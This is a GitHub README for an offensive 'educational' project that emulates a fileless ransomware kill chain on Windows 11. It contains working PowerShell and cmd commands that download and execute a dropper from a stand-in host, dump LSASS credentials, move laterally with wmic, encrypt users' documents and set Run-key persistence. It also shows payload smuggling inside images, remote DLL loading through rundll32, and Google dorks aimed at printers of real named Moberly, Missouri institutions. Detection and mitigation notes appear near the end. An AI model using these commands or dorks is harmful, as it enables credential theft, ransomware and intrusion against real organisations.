

# Overview:

![Demo Screenshot](https://github.com/user-attachments/assets/f93a65bd-d000-41f0-a941-631f047417e4)

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Lab Simulation Example](#lab-simulation-example)
- [Reconnaissance with Google Dorks](#reconnaissance-with-google-dorks)
- [LOLBins Overview](#lolbins-overview)
- [Fileless Dropper Embedding](#fileless-dropper-embedding)
- [Exploiting Print Spooler & HiveNightmare](#exploiting-print-spooler--hivenightmare)
- [Reflective DLL Injection](#reflective-dll-injection)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Detection & Mitigation](#detection--mitigation)
- [Legal Disclaimer](#legal-disclaimer)
- [References & Further Reading](#references--further-reading)

---

## Overview

**NSFW** is an educational red/purple team research project that simulates a **fileless malware** attack framework on **Windows 11**. It enables the emulation of real-world adversary kill chains using [MITRE ATT&CK](https://attack.mitre.org/) techniques, with a focus on stealthy, fileless operations.

> **Warning:** For research and training in isolated labs only. **Do not use on production or unauthorized systems.**

---

## Features

- Simulates end-to-end fileless ransomware/wiperware attacks
- Demonstrates use of Living Off the Land Binaries (LOLBins)
- Showcases credential access, privilege escalation, lateral movement, and persistence
- Contains practical lab and reconnaissance examples
- Maps to MITRE ATT&CK for blue team detection exercises

---

## Lab Simulation Example

The following PowerShell simulation demonstrates a typical fileless ransomware attack chain using built-in Windows tools (LOLBins):

```powershell
# Initial Access: Load dropper
IEX(New-Object Net.WebClient).DownloadString("http://malicious.com/dropper.ps1")

# Execution: Decode and load in-memory payload
$bytes = [System.Convert]::FromBase64String("[Base64Payload]") 
[System.Reflection.Assembly]::Load($bytes)

# Privilege Escalation
Start-Process powershell -Args "-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1" -Verb RunAs

# Credential Access
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Lateral Movement
wmic /node:targetPC process call create "powershell.exe -File \\share\payload.ps1"

# File Encryption Example
$files = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
foreach ($file in $files) {
  $data = Get-Content $file.FullName -Raw
  $aes = New-Object System.Security.Cryptography.AesManaged
  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
  $aes.IV = New-Object byte[] 16
  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
}

# Persistence
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
```

---

## Reconnaissance with Google Dorks

**Objective:** Identify publicly exposed printer services in Moberly, Missouri, potentially vulnerable to exploits like PrintNightmare.

**Sample Google Dork Queries:**

```
inurl:"/hp/device/this.LCDispatcher" "Moberly"
intitle:"Printer Status" "Moberly Public Schools"
intitle:"Web Image Monitor" inurl:"/wim" "Moberly"
inurl:"/printer/main.html" "City of Moberly"
intitle:"Web Jetadmin" "Moberly"
inurl:"/printers/" "Moberly"
inurl:"/PPS/public/" "Moberly"
intitle:"Konica Minolta" inurl:"/wcd/" "Moberly"
intitle:"PaperCut MF" "Moberly"
intitle:"Lexmark" inurl:"/printer/" "Moberly"
intitle:"Canon Remote UI" "Moberly"
intitle:"EpsonNet Config" "Moberly"
```

---

## LOLBins Overview

**Living Off the Land Binaries (LOLBins)** are legitimate, trusted Windows binaries commonly abused by adversaries to bypass security controls and run malicious code filelessly.

**Example Use (Print Service Attack):**

```cmd
rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry
```

> Attackers use LOLBins like `rundll32.exe`, `regsvr32.exe`, and `powershell.exe` to execute payloads from network shares, often after identifying exposed printers or servers via reconnaissance.

---

## Fileless Dropper Embedding

**Goal:** Deliver payloads covertly by embedding archives within images and extracting them using native tools.

**Steps:**

1. **Embed Payload:**
   ```bash
   copy /b nsfw.jpg + payload.7z nsfw.jpg
   ```

2. **Extract & Decode:**
   ```cmd
   certutil -decode nsfw.jpg dropper.7z
   7z x dropper.7z -oC:\Users\Public\
   ```

> This method bypasses traditional file extension filtering and leverages built-in tools for evasive delivery.

---

## Exploiting Print Spooler & HiveNightmare

**Key CVEs:**
- **CVE-2021-34527 (PrintNightmare):** Remote code execution via Print Spooler service.
- **CVE-2021-1675:** LPE/RCE in certain Print Spooler configs.
- **CVE-2021-36934 (HiveNightmare):** Allows non-admin users to access Windows hives and dump hashes.

---

## Reflective DLL Injection

**Technique:** Load and execute a malicious DLL directly in memory using reflective loading.

**Example:**
```cmd
rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
```

> This enables stealthy, in-memory execution without leaving artifacts on disk.

---

## MITRE ATT&CK Mapping

| Phase                | Technique                               | ID                   | Description                                              |
|----------------------|-----------------------------------------|----------------------|----------------------------------------------------------|
| Initial Access       | Valid Accounts / Drive-by Compromise    | T1078, T1189         | Compromising public-facing print interfaces              |
| Execution            | DLL Side-Loading / LOLBins              | T1218, T1055.001     | Running DLLs reflectively via trusted binaries           |
| Privilege Escalation | Print Spooler Exploits / Hive ACL Abuse | T1068, T1003.002     | SYSTEM-level access and SAM hash extraction              |
| Defense Evasion      | Fileless Execution / Obfuscated Files   | T1027, T1202         | Encoded payloads delivered via certutil, mshta, etc.     |
| Credential Access    | LSASS Dumping / SAM Hive Access         | T1003                | Credential dumping post HiveNightmare                    |
| Lateral Movement     | SMB/Net Share Enumeration               | T1021.002            | Spread via printer shares or spooler enumeration         |
| Impact               | Data Destruction / Encryption           | T1485, T1486         | Fileless wiperware triggered via DLL payloads            |

---

## Detection & Mitigation

### Detection

- **Sysmon + Sigma Rules:**
  - Monitor `rundll32.exe` loading non-system DLLs
  - Watch for abnormal use of `certutil.exe`, `regsvr32.exe`, `mshta.exe`
  - Track shadow volume access by non-admins

- **SIEM Examples (ELK/Splunk):**
  - Alerts on execution from public shares
  - Parent/child process anomalies (e.g., `explorer.exe` spawning `rundll32.exe`)
  - Suspicious encoded commands in PowerShell or CMD

### Mitigation

- Disable Print Spooler where not needed:
  ```cmd
  Stop-Service -Name Spooler -Force
  Set-Service -Name Spooler -StartupType Disabled
  ```
- Apply all security patches and harden ACLs
- Block or restrict LOLBins with AppLocker or WDAC
- Use EDR solutions that detect reflective DLL loading and in-memory attacks

---

## Legal Disclaimer

> **All content, code, and techniques in this repository are for educational and authorized penetration testing only. Do not use any part of this project outside of controlled, isolated environments and without explicit permission. The authors assume no liability for misuse.**

---

## References & Further Reading

- [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
- [LOLGEN – Generate LOLBin Chains](https://lolgen.hdks.org/)
- [MITRE ATT&CK: S0697](https://attack.mitre.org/software/S0697/)
- [DLL Injection Primer](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
- [Print Spooler Exploit Chain](https://itm4n.github.io/printnightmare-not-over/)
- [Fileless Malware – Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)
- [SysNightmare](https://github.com/GossiTheDog/SystemNightmare)
- [PrintSpoofer (Original)](https://github.com/itm4n/PrintSpoofer/tree/master)
- [PrintSpoofer 2](https://github.com/dievus/printspoofer)
- [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)

---

**Stay safe, research responsibly, and always use in a legal and ethical manner.**
